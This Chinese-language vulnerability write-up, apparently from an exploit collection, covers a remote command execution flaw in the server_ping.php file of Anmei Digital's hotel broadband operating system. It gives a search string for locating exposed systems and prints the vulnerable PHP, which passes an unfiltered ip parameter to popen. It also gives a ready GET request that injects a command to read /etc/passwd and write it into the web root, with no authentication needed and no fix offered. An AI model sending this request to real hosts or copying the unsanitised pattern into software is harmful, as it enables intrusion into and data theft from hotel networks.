# 安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞

# 漏洞描述

安美数字 酒店宽带运营系统 server_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行

## 漏洞影响

<a-checkbox checked>安美数字 酒店宽带运营系统</a-checkbox></br>	

## 网络测绘

<a-checkbox checked>"酒店宽带运营"</a-checkbox></br>

## 漏洞复现

登录页面如下



![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313150127894.png)



存在漏洞的文件为 `server_ping.php`

```php
<?
if (!isset($ip) || $ip == "" || !isset($id) || $id == "") exit;

$cmd = "ping -c 2 -s 65 $ip";
$fp = popen($cmd, "r");
$getString = "";
if ($fp) {
	while (($line = fgets($fp, 512))) {
		$getString .= trim($line);
	}
	pclose($fp);
	
}

if (strstr($getString, "2 received, 0%")) {
	echo "<html><body><script language=\"javascript\">\n";
	echo "parent.doTestResult('$id', 'ok');\n";
	echo "</script></body></html>\n";
} else {
	echo "<html><body><script language=\"javascript\">\n";
	echo "parent.doTestResult('$id', 'no');\n";
	echo "</script></body></html>\n";
}
?>
```

```plain
$cmd = "ping -c 2 -s 65 $ip";
$fp = popen($cmd, "r");
```

GET传入 `$ip参数` 后直接命令执行，并且文件无权限要求

请求包为

```plain
GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
```

![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313150127920.png)



